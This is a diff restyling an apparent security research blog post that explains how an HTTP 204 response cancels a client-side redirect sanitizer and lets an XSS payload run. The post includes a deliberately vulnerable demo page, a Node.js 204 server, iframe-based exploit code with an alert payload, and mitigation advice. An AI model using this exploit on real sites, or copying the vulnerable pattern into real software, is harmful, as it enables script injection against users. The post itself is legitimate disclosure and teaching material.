@@ -5,102 +5,74 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Bypassing Client-Side Sanitizers with HTTP 204 Race Conditions — ZeroSploit</title>
 <meta name="description" content="How HTTP 204 No Content cancels browser navigation, turning a client-side redirect sanitizer into a race condition exploitable for XSS."/>
-<meta name="theme-color" content="#060A09"/>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><text x='50%25' y='55%25' dominant-baseline='central' text-anchor='middle' font-size='24' fill='%231FC97A'>$</text></svg>"/>
+<meta name="theme-color" content="#0a1e21"/>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><text x='50%25' y='55%25' dominant-baseline='central' text-anchor='middle' font-size='24' fill='%2301bd7d'>$</text></svg>"/>
 <link rel="preconnect" href="https://fonts.googleapis.com"/>
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@300;400;500;600&family=IBM+Plex+Serif:wght@400;500&display=swap" rel="stylesheet"/>
 <link rel="stylesheet" href="../assets/style.css"/>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"/>
 </head>
 <body>
 
-<svg class="grain" aria-hidden="true"><filter id="noise"><feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="4" stitchTiles="stitch"/><feColorMatrix type="saturate" values="0"/></filter><rect width="100%" height="100%" filter="url(#noise)"/></svg>
-
-<div class="scene" aria-hidden="true">
-  <div class="glow-1"></div>
-  <div class="glow-2"></div>
-</div>
-
+<!-- Nav -->
 <nav>
-  <a class="nav-logo" href="/">zero<span class="dollar">$</span>ploit</a>
-  <div class="nav-menu">
-    <a href="/#research">Research</a>
-    <a href="/#disciplines">Disciplines</a>
-    <a href="/#about">About</a>
-    <a class="nav-contact" href="mailto:security@zerosploit.io">Contact</a>
+  <div class="nav-inner">
+    <a class="nav-logo" href="/">zero<span class="dollar">$</span>ploit</a>
+    <div class="nav-sep"></div>
+    <div class="nav-links">
+      <a class="nav-link" href="/#research">Research</a>
+      <a class="nav-right" href="mailto:security@zerosploit.io">Report a bug &nbsp;&rarr;</a>
+    </div>
+    <button class="nav-ham" aria-label="Toggle menu">
+      <span></span><span></span><span></span>
+    </button>
   </div>
-  <button class="nav-ham" aria-label="Toggle menu">
-    <span></span><span></span><span></span>
-  </button>
 </nav>
 
-<div class="post-wrap">
+<!-- Back -->
+<div class="art-back">
+  <a href="/">&larr; All research</a>
+</div>
 
-  <a class="post-back" href="/">&larr; Back to research</a>
-
-  <header class="post-header">
-    <div class="post-sev">
-      <div class="sev sev-h">High &middot; XSS Bypass Technique</div>
-    </div>
-    <h1 class="post-title">Bypassing Client-Side Sanitizers with HTTP 204 Race Conditions</h1>
-    <div class="post-meta-grid">
-      <div class="pm-cell">
-        <div class="pm-label">Category</div>
-        <div class="pm-value">Web / Client-Side</div>
-      </div>
-      <div class="pm-cell">
-        <div class="pm-label">Technique</div>
-        <div class="pm-value high">Race Condition</div>
-      </div>
-      <div class="pm-cell">
-        <div class="pm-label">Impact</div>
-        <div class="pm-value high">XSS Execution</div>
-      </div>
-      <div class="pm-cell">
-        <div class="pm-label">Series</div>
-        <div class="pm-value">Part 1</div>
-      </div>
-      <div class="pm-cell">
-        <div class="pm-label">Published</div>
-        <div class="pm-value">2026</div>
-      </div>
-      <div class="pm-cell">
-        <div class="pm-label">Status</div>
-        <div class="pm-value">Active Research</div>
-      </div>
-    </div>
-  </header>
-
-  <div class="post-toc">
-    <div class="post-toc-title">Contents</div>
-    <ol>
-      <li><a href="#pattern">The Vulnerable Pattern</a></li>
-      <li><a href="#async">Navigation is Asynchronous</a></li>
-      <li><a href="#204">HTTP 204: No Content, Stay Where You Are</a></li>
-      <li><a href="#race">The Race Condition</a></li>
-      <li><a href="#server">The 204 Server</a></li>
-      <li><a href="#window-open">First Attempt: window.open</a></li>
-      <li><a href="#iframes">The Breakthrough: iframes</a></li>
-      <li><a href="#impact">Why This Matters</a></li>
-      <li><a href="#proof">The Proof</a></li>
-      <li><a href="#takeaways">Takeaways</a></li>
-    </ol>
+<!-- Header -->
+<header class="art-header">
+  <h1>Bypassing Client-Side Sanitizers with HTTP 204 Race Conditions</h1>
+  <p class="art-subtitle">How HTTP 204 No Content cancels browser navigation, turning a window.location.href redirect sanitizer into a race condition exploitable for XSS.</p>
+  <div class="art-meta">
+    <span class="author">Zeyad Zonkorany</span>
+    <span>&middot;</span>
+    <span>2026</span>
+    <span>&middot;</span>
+    <span>12 min read</span>
   </div>
+</header>
 
-  <div class="post-body">
+<!-- Details -->
+<div class="art-details">
+  <div class="art-details-grid">
+    <div><span class="label">Category&nbsp;</span><span class="val">Web / Client-Side</span></div>
+    <div><span class="label">Technique&nbsp;</span><span class="val">Race Condition</span></div>
+    <div><span class="label">Impact&nbsp;</span><span class="val">XSS Execution</span></div>
+    <div><span class="label">Series&nbsp;</span><span class="val-mono">Part 1</span></div>
+    <div><span class="label">Status&nbsp;</span><span class="val-green">Active Research</span></div>
+  </div>
+</div>
 
-    <p>I've been spending a lot of time looking at how web applications handle user input on the client side. Not server-side validation — that's well understood. I'm talking about the JavaScript layer, the stuff that runs in the browser before anything touches the backend. And I kept running into the same pattern over and over: developers using <code>window.location.href</code> as a sanitizer.</p>
+<!-- Body -->
+<article class="art-body">
 
-    <p>The idea is simple. Check the input, and if it looks dangerous, redirect the user away before anything bad happens. Sounds reasonable. But there's a fundamental flaw in how browsers handle navigation, and it creates a race condition that lets you bypass the entire check.</p>
+  <p>I've been spending a lot of time looking at how web applications handle user input on the client side. Not server-side validation — that's well understood. I'm talking about the JavaScript layer, the stuff that runs in the browser before anything touches the backend. And I kept running into the same pattern over and over: developers using <code>window.location.href</code> as a sanitizer.</p>
 
-    <p>In this post I'll walk through the research, the discovery, and the escalation — from understanding the vulnerability pattern to a working proof of concept that pops an alert through a supposedly sanitized page.</p>
+  <p>The idea is simple. Check the input, and if it looks dangerous, redirect the user away before anything bad happens. Sounds reasonable. But there's a fundamental flaw in how browsers handle navigation, and it creates a race condition that lets you bypass the entire check.</p>
 
-    <h2 id="pattern">The Vulnerable Pattern</h2>
+  <p>In this post I'll walk through the research, the discovery, and the escalation — from understanding the vulnerability pattern to a working proof of concept that pops an alert through a supposedly sanitized page.</p>
 
-    <p>Here's a page I built to demonstrate the issue. You'll find variations of this pattern all over production codebases:</p>
+  <h2>The Vulnerable Pattern</h2>
 
-    <pre><code class="language-html">&lt;!DOCTYPE html&gt;
+  <p>Here's a page I built to demonstrate the issue. You'll find variations of this pattern all over production codebases:</p>
+
+  <pre><code class="language-html">&lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;body&gt;
     &lt;h2 id="greeting"&gt;hi&lt;/h2&gt;
@@ -119,21 +91,22 @@
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
-    <p>Walk through it. The page reads a <code>name</code> parameter from the URL. If that parameter contains <code>&lt;</code> or <code>&gt;</code>, it redirects to <code>/login.html</code>. The developer's thinking: the redirect happens before the <code>setTimeout</code> callback fires, so the dangerous input never reaches <code>innerHTML</code>.</p>
+  <p>Walk through it. The page reads a <code>name</code> parameter from the URL. If that parameter contains <code>&lt;</code> or <code>&gt;</code>, it redirects to <code>/login.html</code>. The developer's thinking: the redirect happens before the <code>setTimeout</code> callback fires, so the dangerous input never reaches <code>innerHTML</code>.</p>
 
-    <p>If you open this page with <code>?name=Guest</code>, you get a clean "Welcome, Guest" message. If you open it with <code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>, the sanitizer catches the angle brackets and sends you to the login page. Works exactly as intended.</p>
+  <p>If you open this page with <code>?name=Guest</code>, you get a clean "Welcome, Guest" message. If you open it with <code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>, the sanitizer catches the angle brackets and sends you to the login page. Works exactly as intended.</p>
 
-    <p>Except it doesn't. Not really.</p>
+  <p>Except it doesn't. Not really.</p>
 
-    <h2 id="async">The Flaw: Navigation is Asynchronous</h2>
+  <h2>The Flaw: Navigation is Asynchronous</h2>
 
-    <p>Here's what most developers don't realize about <code>window.location.href</code>:</p>
+  <p>Here's what most developers don't realize about <code>window.location.href</code>:</p>
 
-    <div class="info-box">
-      <strong>Setting <code>window.location.href</code> does not immediately navigate the page.</strong> It queues a navigation. The browser continues executing the current script to completion before it actually starts the navigation process.
-    </div>
+  <div class="callout">
+    <div class="callout-label">Key insight</div>
+    <p>Setting <code>window.location.href</code> does not immediately navigate the page. It queues a navigation. The browser continues executing the current script to completion before it actually starts the navigation process.</p>
+  </div>
 
-    <pre><code class="language-javascript">if (userName.includes('&lt;') || userName.includes('&gt;')) {
+  <pre><code class="language-javascript">if (userName.includes('&lt;') || userName.includes('&gt;')) {
     window.location.href = "/login.html";  // queues navigation
 }
 
@@ -141,44 +114,44 @@ setTimeout(() => {
     document.getElementById('greeting').innerHTML = "Welcome, " + userName;
 }, 500);  // this still gets registered</code></pre>
 
-    <p>So when the code sets the redirect and registers the <code>setTimeout</code>, both things happen. The redirect is queued, and the timer is registered. The browser doesn't stop executing JavaScript just because you set <code>location.href</code>. The navigation happens asynchronously — the browser sends a request to <code>/login.html</code>, waits for the response, and only then replaces the current document.</p>
+  <p>Both things happen. The redirect is queued, and the <code>setTimeout</code> is registered. The browser doesn't stop executing JavaScript just because you set <code>location.href</code>. The navigation happens asynchronously — the browser sends a request to <code>/login.html</code>, waits for the response, and only then replaces the current document.</p>
 
-    <p>That gap between "redirect requested" and "redirect completed" is where this whole attack lives.</p>
+  <p>That gap between "redirect requested" and "redirect completed" is where this whole attack lives.</p>
 
-    <h2 id="204">HTTP 204: No Content, Stay Where You Are</h2>
+  <h2>HTTP 204: No Content, Stay Where You Are</h2>
 
-    <p>HTTP 204 is one of those status codes that most developers know exists but never think twice about. The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204">MDN documentation</a> describes it as a successful response indicating that "the client doesn't need to navigate away from its current page."</p>
+  <p>HTTP 204 is one of those status codes that most developers know exists but never think twice about. The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204">MDN documentation</a> describes it as a successful response indicating that "the client doesn't need to navigate away from its current page."</p>
 
-    <p>According to <a href="https://www.rfc-editor.org/info/rfc9110/#status.204">RFC 9110</a>, a 204 response means the server successfully processed the request but has no content to return. The critical part is what the browser does with it during navigation: <strong>nothing</strong>. The browser stays on the current page. The document is preserved. JavaScript keeps running.</p>
+  <p>According to <a href="https://www.rfc-editor.org/info/rfc9110/#status.204">RFC 9110</a>, a 204 response means the server successfully processed the request but has no content to return. The critical part is what the browser does with it during navigation: <strong>nothing</strong>. The browser stays on the current page. The document is preserved. JavaScript keeps running.</p>
 
-    <p>As <a href="https://www.abstractapi.com/guides/http-status-codes/204">AbstractAPI's guide on 204</a> puts it: "Unlike other responses, 204 does not refresh or navigate away from the page. The user's view remains exactly as it was."</p>
+  <p>As <a href="https://www.abstractapi.com/guides/http-status-codes/204">AbstractAPI's guide on 204</a> puts it: "Unlike other responses, 204 does not refresh or navigate away from the page. The user's view remains exactly as it was."</p>
 
-    <p>This is the intended behavior. It's used for things like auto-save in wiki editors — you <code>PUT</code> your changes, the server responds with 204, and the editor stays exactly where it is. No page reload, no navigation. The <a href="https://chromium.googlesource.com/chromium/src/+/8c0cc38022..783044b798">Chromium source code</a> has gone through multiple revisions on how to handle this exact scenario.</p>
+  <p>This is the intended behavior. It's used for things like auto-save in wiki editors — you <code>PUT</code> your changes, the server responds with 204, and the editor stays exactly where it is. No page reload, no navigation. The <a href="https://chromium.googlesource.com/chromium/src/+/8c0cc38022..783044b798">Chromium source code</a> has gone through multiple revisions on how to handle this exact scenario.</p>
 
-    <p>So what happens if we navigate a page to a URL that responds with 204? The page stays alive. All registered timers keep running. The document is preserved.</p>
+  <p>So what happens if we navigate a page to a URL that responds with 204? The page stays alive. All registered timers keep running. The document is preserved.</p>
 
-    <h2 id="race">The Race Condition</h2>
+  <h2>The Race Condition</h2>
 
-    <p>Now put it together:</p>
+  <p>Now put it together:</p>
 
-    <ol>
-      <li>The victim page loads with a malicious <code>name</code> parameter containing an XSS payload</li>
-      <li>The sanitizer detects <code>&lt;</code> and sets <code>window.location.href = "/login.html"</code> — a navigation is queued</li>
-      <li>The <code>setTimeout</code> is registered (fires at 500ms)</li>
-      <li>The browser starts fetching <code>/login.html</code></li>
-      <li><strong>Before the <code>/login.html</code> response arrives</strong>, we navigate the page to a URL that returns HTTP 204</li>
-      <li>The 204 response tells the browser: stay on the current page</li>
-      <li>The original document is preserved — the sanitizer's redirect was effectively cancelled</li>
-      <li>The <code>setTimeout</code> fires, <code>innerHTML</code> writes the unsanitized input, and XSS executes</li>
-    </ol>
+  <ol>
+    <li>The victim page loads with a malicious <code>name</code> parameter containing an XSS payload</li>
+    <li>The sanitizer detects <code>&lt;</code> and sets <code>window.location.href = "/login.html"</code> — a navigation is queued</li>
+    <li>The <code>setTimeout</code> is registered (fires at 500ms)</li>
+    <li>The browser starts fetching <code>/login.html</code></li>
+    <li><strong>Before the <code>/login.html</code> response arrives</strong>, we navigate the page to a URL that returns HTTP 204</li>
+    <li>The 204 response tells the browser: stay on the current page</li>
+    <li>The original document is preserved — the sanitizer's redirect was effectively cancelled</li>
+    <li>The <code>setTimeout</code> fires, <code>innerHTML</code> writes the unsanitized input, and XSS executes</li>
+  </ol>
 
-    <p>The race is between the <code>/login.html</code> response and our 204 delivery. If we get the 204 in before <code>/login.html</code> loads, we win.</p>
+  <p>The race is between the <code>/login.html</code> response and our 204 delivery. If we get the 204 in before <code>/login.html</code> loads, we win.</p>
 
-    <h2 id="server">The 204 Server</h2>
+  <h2>The 204 Server</h2>
 
-    <p>The attacker needs a server that returns 204. Here's the simplest version using only Node.js built-in modules:</p>
+  <p>The attacker needs a server that returns 204. Here's the simplest version using only Node.js built-in modules:</p>
 
-    <pre><code class="language-javascript">const http = require('http');
+  <pre><code class="language-javascript">const http = require('http');
 
 http.createServer((req, res) => {
     // CORS headers so cross-origin iframes can trigger it
@@ -196,13 +169,13 @@ http.createServer((req, res) => {
     console.log('204 server running on port 9090');
 });</code></pre>
 
-    <p>Hit <code>/trigger-204</code> from anywhere, get a 204 back, the browser stays where it is. That's all we need.</p>
+  <p>Hit <code>/trigger-204</code> from anywhere, get a 204 back, the browser stays where it is. That's all we need.</p>
 
-    <h2 id="window-open">First Attempt: window.open (The Naive Approach)</h2>
+  <h2>First Attempt: window.open</h2>
 
-    <p>My first instinct was to use <code>window.open</code>. Open the victim page in a new window, wait a bit, then navigate that window to our 204 endpoint:</p>
+  <p>My first instinct was to use <code>window.open</code>. Open the victim page in a new window, wait a bit, then navigate that window to our 204 endpoint:</p>
 
-    <pre><code class="language-javascript">function exploit() {
+  <pre><code class="language-javascript">function exploit() {
     let payload = "&lt;img src=x onerror=alert('XSS')&gt;";
     let url = "http://victim.com/page.html?name=" + encodeURIComponent(payload);
 
@@ -213,11 +186,11 @@ http.createServer((req, res) => {
     }, 400);
 }</code></pre>
 
-    <p>It didn't work. Not once, across dozens of attempts at different delays (50ms through 500ms). Every single time, the redirect completed before the 204 could arrive.</p>
+  <p>It didn't work. Not once, across dozens of attempts at different delays (50ms through 500ms). Every single time, the redirect completed before the 204 could arrive.</p>
 
-    <p>I added timing instrumentation and found the problem. <code>window.open()</code> has significant overhead — on my machine, it took roughly <strong>467ms</strong> just to create the new window, initialize the renderer, and start loading the page. By the time the victim page's sanitizer fired the redirect and the <code>/login.html</code> response came back, my 204 was still sitting in a <code>setTimeout</code> waiting to fire.</p>
+  <p>I added timing instrumentation and found the problem. <code>window.open()</code> has significant overhead — on my machine, it took roughly <strong>467ms</strong> just to create the new window, initialize the renderer, and start loading the page. By the time the victim page's sanitizer fired the redirect and the <code>/login.html</code> response came back, my 204 was still sitting in a <code>setTimeout</code> waiting to fire.</p>
 
-    <pre><code>t=0ms      window.open() called
+  <pre><code>t=0ms      window.open() called
 t=0-467ms  browser creates new window (overhead)
 t=467ms    victim.html starts loading
 t=470ms    script executes, redirect to /login.html queued
@@ -228,13 +201,13 @@ t=670ms    page navigates to login.html — game over
 Meanwhile:
 t=400ms    our setTimeout fires, but the page hasn't even loaded yet</code></pre>
 
-    <p>The 204 arrives either before the page loads (useless) or after the redirect completes (too late). The window creation overhead makes the timing window impossibly tight.</p>
+  <p>The 204 arrives either before the page loads (useless) or after the redirect completes (too late). The window creation overhead makes the timing window impossibly tight.</p>
 
-    <h2 id="iframes">The Breakthrough: iframes</h2>
+  <h2>The Breakthrough: iframes</h2>
 
-    <p>After <code>window.open</code> failed, I started thinking about what else could hold a reference to a browsing context. And then it clicked: <strong>iframes load in-process</strong>. There's no new window creation, no renderer initialization, no cross-process handshake. The iframe's page starts loading immediately when you set <code>src</code>.</p>
+  <p>After <code>window.open</code> failed, I started thinking about what else could hold a reference to a browsing context. And then it clicked: <strong>iframes load in-process</strong>. There's no new window creation, no renderer initialization, no cross-process handshake. The iframe's page starts loading immediately when you set <code>src</code>.</p>
 
-    <pre><code class="language-javascript">function exploit() {
+  <pre><code class="language-javascript">function exploit() {
     let payload = "&lt;img src=x onerror=alert('XSS')&gt;";
     let url = "http://victim.com/page.html?name=" + encodeURIComponent(payload);
 
@@ -247,137 +220,141 @@ t=400ms    our setTimeout fires, but the page hasn't even loaded yet</code></pre
     }, 100);
 }</code></pre>
 
-    <p>100ms. That's all it takes. The iframe loads the victim page almost instantly, the sanitizer fires the redirect, and our 204 arrives before <code>/login.html</code> responds. The page stays alive, the <code>setTimeout</code> fires, <code>innerHTML</code> writes the payload, and XSS executes.</p>
+  <p>100ms. That's all it takes. The iframe loads the victim page almost instantly, the sanitizer fires the redirect, and our 204 arrives before <code>/login.html</code> responds. The page stays alive, the <code>setTimeout</code> fires, <code>innerHTML</code> writes the payload, and XSS executes.</p>
 
-    <p>I ran this against my test setup and it hit on the first try. Then the second. Then twenty times in a row. Here's what the server logs look like when the exploit succeeds:</p>
+  <p>I ran this against my test setup and it hit on the first try. Then the second. Then twenty times in a row. Here's what the server logs look like when the exploit succeeds:</p>
 
-    <pre><code>[VICTIM] GET /victim.html?name=&lt;img src=x onerror=...&gt;
+  <pre><code>[VICTIM] GET /victim.html?name=&lt;img src=x onerror=...&gt;
 [VICTIM] GET /login.html           ← sanitizer redirect fires
 [C2]     204 triggered              ← our 204 arrives
 [VICTIM] GET /x                    ← XSS payload executed (img src=x)
 
 *** [XSS CONFIRMED] ***</code></pre>
 
-    <p>Notice something interesting: <code>/login.html</code> is still requested. The sanitizer's redirect does fire. But the 204 navigation supersedes it. The browser cancels the pending <code>/login.html</code> response and stays on the original page. The document survives. The timer fires. XSS executes.</p>
+  <p>Notice something interesting: <code>/login.html</code> is still requested. The sanitizer's redirect does fire. But the 204 navigation supersedes it. The browser cancels the pending <code>/login.html</code> response and stays on the original page. The document survives. The timer fires. XSS executes.</p>
 
-    <h2 id="impact">Why This Matters</h2>
+  <h2>Why This Matters</h2>
 
-    <p>This isn't just a contrived demo. The vulnerable pattern — "check input, redirect if bad, then render" — exists everywhere JavaScript does client-side validation. Any page that:</p>
+  <p>This isn't just a contrived demo. The vulnerable pattern — "check input, redirect if bad, then render" — exists everywhere JavaScript does client-side validation. Any page that:</p>
 
-    <ol>
-      <li>Reads user input from the URL</li>
-      <li>Checks it for dangerous characters</li>
-      <li>Uses <code>window.location.href</code> (or <code>location.replace</code>, or <code>location.assign</code>) to redirect away</li>
-      <li>Has a delayed sink (<code>setTimeout</code>, <code>requestAnimationFrame</code>, async callback, promise chain)</li>
-    </ol>
+  <ol>
+    <li>Reads user input from the URL</li>
+    <li>Checks it for dangerous characters</li>
+    <li>Uses <code>window.location.href</code> (or <code>location.replace</code>, or <code>location.assign</code>) to redirect away</li>
+    <li>Has a delayed sink (<code>setTimeout</code>, <code>requestAnimationFrame</code>, async callback, promise chain)</li>
+  </ol>
 
-    <p>...is potentially exploitable with this technique. The <a href="https://capec.mitre.org/data/definitions/3000.html">MITRE CAPEC framework</a> classifies attacks that exploit trust in client-side validation as a distinct category for good reason — the browser's execution model is not what most developers assume it is. Navigation is not synchronous. Redirects are not instant. And HTTP 204 preserves the document in a way that breaks the security assumptions of client-side sanitizers.</p>
+  <p>...is potentially exploitable with this technique. The <a href="https://capec.mitre.org/data/definitions/3000.html">MITRE CAPEC framework</a> classifies attacks that exploit trust in client-side validation as a distinct category for good reason — the browser's execution model is not what most developers assume it is. Navigation is not synchronous. Redirects are not instant. And HTTP 204 preserves the document in a way that breaks the security assumptions of client-side sanitizers.</p>
 
-    <h2 id="proof">The Proof</h2>
+  <h2>The Proof</h2>
 
-    <p>Here's a full video walkthrough of the exploit in action — from opening the vulnerable page to the XSS alert firing:</p>
+  <p>Here's a full video walkthrough of the exploit in action — from opening the vulnerable page to the XSS alert firing:</p>
 
-    <div class="post-video">
-      <video controls preload="metadata">
-        <source src="../media/http-204-race-poc.mp4" type="video/mp4"/>
-        Your browser does not support the video element.
-      </video>
-    </div>
-
-    <p>The attacker page creates an iframe pointing to the victim with an XSS payload in the URL parameter. At 100ms, it navigates the iframe to the 204 endpoint. The victim page's sanitizer fires the redirect to <code>/login.html</code>, but the 204 cancels it. 500ms later, the <code>innerHTML</code> sink writes the payload and the XSS executes. An alert box confirms code execution in the victim's origin.</p>
-
-    <p>The full PoC files are available on my GitHub.</p>
-
-    <h2 id="takeaways">Takeaways</h2>
-
-    <p>Client-side redirects are not sanitizers. If your security model depends on <code>window.location.href</code> firing before a sink executes, you have a race condition. HTTP 204 gives attackers a clean way to cancel that redirect and keep the document alive.</p>
-
-    <p>The fix is straightforward: don't use client-side redirects as security controls. Sanitize on the server. If you must check on the client, use synchronous blocking — <code>return</code> after the redirect, don't register the sink at all if validation fails, or better yet, don't use <code>innerHTML</code> with unsanitized input in the first place.</p>
-
-    <h2>References</h2>
-
-    <table>
-      <thead>
-        <tr>
-          <th>Source</th>
-          <th>Notes</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204">MDN: HTTP 204 No Content</a></td>
-          <td>Official documentation on 204 behavior</td>
-        </tr>
-        <tr>
-          <td><a href="https://www.rfc-editor.org/info/rfc9110/#status.204">RFC 9110 § 15.3.5</a></td>
-          <td>HTTP specification defining 204 semantics</td>
-        </tr>
-        <tr>
-          <td><a href="https://www.abstractapi.com/guides/http-status-codes/204">AbstractAPI: HTTP 204 Guide</a></td>
-          <td>Practical guide on 204 and browser behavior</td>
-        </tr>
-        <tr>
-          <td><a href="https://chromium.googlesource.com/chromium/src/+/8c0cc38022..783044b798">Chromium Source Changes</a></td>
-          <td>Chromium's handling of 204 during navigation</td>
-        </tr>
-        <tr>
-          <td><a href="https://trustedsec.com/blog/simple-data-exfiltration-through-xss">TrustedSec: XSS Exfiltration</a></td>
-          <td>Related work on XSS data exfiltration techniques</td>
-        </tr>
-        <tr>
-          <td><a href="https://capec.mitre.org/data/definitions/3000.html">MITRE CAPEC-3000</a></td>
-          <td>Attack pattern classification for client-side exploitation</td>
-        </tr>
-        <tr>
-          <td><a href="https://www.w3.org/TR/2011/WD-html5-20110405/Overview.html">W3C HTML5 Specification</a></td>
-          <td>Navigation and browsing context behavior</td>
-        </tr>
-        <tr>
-          <td><a href="https://stackoverflow.com/questions/59884115/how-to-handle-204-errow-from-window-location-url">Stack Overflow: 204 and window.location</a></td>
-          <td>Developer discussion on 204 navigation edge cases</td>
-        </tr>
-      </tbody>
-    </table>
-
+  <div class="art-video">
+    <video controls preload="metadata">
+      <source src="../media/http-204-race-poc.mp4" type="video/mp4"/>
+      Your browser does not support the video element.
+    </video>
   </div>
-</div>
 
+  <p>The attacker page creates an iframe pointing to the victim with an XSS payload in the URL parameter. At 100ms, it navigates the iframe to the 204 endpoint. The victim page's sanitizer fires the redirect to <code>/login.html</code>, but the 204 cancels it. 500ms later, the <code>innerHTML</code> sink writes the payload and the XSS executes. An alert box confirms code execution in the victim's origin.</p>
+
+  <p>The full PoC files are available on my GitHub.</p>
+
+  <h2>Takeaways</h2>
+
+  <p>Client-side redirects are not sanitizers. If your security model depends on <code>window.location.href</code> firing before a sink executes, you have a race condition. HTTP 204 gives attackers a clean way to cancel that redirect and keep the document alive.</p>
+
+  <p>The fix is straightforward: don't use client-side redirects as security controls. Sanitize on the server. If you must check on the client, use synchronous blocking — <code>return</code> after the redirect, don't register the sink at all if validation fails, or better yet, don't use <code>innerHTML</code> with unsanitized input in the first place.</p>
+
+  <h2>References</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Source</th>
+        <th>Notes</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204">MDN: HTTP 204 No Content</a></td>
+        <td>Official documentation on 204 behavior</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.rfc-editor.org/info/rfc9110/#status.204">RFC 9110 § 15.3.5</a></td>
+        <td>HTTP specification defining 204 semantics</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.abstractapi.com/guides/http-status-codes/204">AbstractAPI: HTTP 204 Guide</a></td>
+        <td>Practical guide on 204 and browser behavior</td>
+      </tr>
+      <tr>
+        <td><a href="https://chromium.googlesource.com/chromium/src/+/8c0cc38022..783044b798">Chromium Source Changes</a></td>
+        <td>Chromium's handling of 204 during navigation</td>
+      </tr>
+      <tr>
+        <td><a href="https://trustedsec.com/blog/simple-data-exfiltration-through-xss">TrustedSec: XSS Exfiltration</a></td>
+        <td>Related work on XSS data exfiltration techniques</td>
+      </tr>
+      <tr>
+        <td><a href="https://capec.mitre.org/data/definitions/3000.html">MITRE CAPEC-3000</a></td>
+        <td>Attack pattern classification for client-side exploitation</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.w3.org/TR/2011/WD-html5-20110405/Overview.html">W3C HTML5 Specification</a></td>
+        <td>Navigation and browsing context behavior</td>
+      </tr>
+      <tr>
+        <td><a href="https://stackoverflow.com/questions/59884115/how-to-handle-204-errow-from-window-location-url">Stack Overflow: 204 and window.location</a></td>
+        <td>Developer discussion on 204 navigation edge cases</td>
+      </tr>
+    </tbody>
+  </table>
+
+</article>
+
+<!-- Author -->
+<section class="art-author">
+  <div class="art-author-inner">
+    <div class="art-author-name">Zeyad Zonkorany</div>
+    <div class="art-author-role">Security Researcher, ZeroSploit</div>
+    <p class="art-author-bio">Focused on client-side security, browser exploitation, and race conditions in web applications. Reports vulnerabilities through coordinated disclosure.</p>
+  </div>
+</section>
+
+<!-- Footer -->
 <footer>
-  <div class="footer-inner">
-    <div class="footer-top">
-      <div class="footer-brand">
-        <div class="f-logo">zero<span class="dollar">$</span>ploit</div>
-        <p class="f-desc">Independent vulnerability research. Original findings, full documentation, responsible disclosure.</p>
-        <div class="f-pgp">
-          <a href="mailto:security@zerosploit.io">security@zerosploit.io</a><br/>
-          PGP: DEAD BEEF C0DE F00D 1337
-        </div>
-      </div>
-      <div class="footer-links">
-        <div class="footer-col">
-          <h5>Research</h5>
-          <ul>
-            <li><a href="/">All Writeups</a></li>
-            <li><a href="#">CVE Index</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h5>Links</h5>
-          <ul>
-            <li><a href="/#about">About</a></li>
-            <li><a href="#">GitHub</a></li>
-            <li><a href="#">Twitter / X</a></li>
-          </ul>
-        </div>
+  <div class="footer-grid">
+    <div>
+      <div class="nav-logo" style="margin-bottom:16px;">zero<span class="dollar">$</span>ploit</div>
+      <p class="footer-brand-text">Independent vulnerability research. Original findings, full documentation, responsible disclosure.</p>
+      <div class="footer-social">
+        <a href="https://github.com/zerosploit-research" target="_blank">GitHub</a>
       </div>
     </div>
-    <div class="footer-bottom">
-      <span class="f-copy">&copy; 2026 ZeroSploit &middot; Research for defensive purposes only</span>
-      <div class="f-status">
-        <span class="f-status-dot"></span>
-        operational
-      </div>
+    <div>
+      <div class="footer-col-title">Research</div>
+      <ul class="footer-col-links">
+        <li><a href="/">All Research</a></li>
+      </ul>
     </div>
+    <div>
+      <div class="footer-col-title">About</div>
+      <ul class="footer-col-links">
+        <li><a href="mailto:security@zerosploit.io">Contact</a></li>
+      </ul>
+    </div>
+    <div>
+      <div class="footer-col-title">Contact</div>
+      <ul class="footer-contact">
+        <li>security@zerosploit.io</li>
+      </ul>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 ZeroSploit. All rights reserved.</span>
+    <span>Coordinated disclosure &middot; 90-day policy</span>
   </div>
 </footer>
 
@@ -386,7 +363,7 @@ t=400ms    our setTimeout fires, but the page hasn't even loaded yet</code></pre
 <script>
 document.querySelector('.nav-ham').addEventListener('click', function() {
   this.classList.toggle('active');
-  document.querySelector('.nav-menu').classList.toggle('open');
+  document.querySelector('.nav-links').classList.toggle('open');
 });
 </script>
 
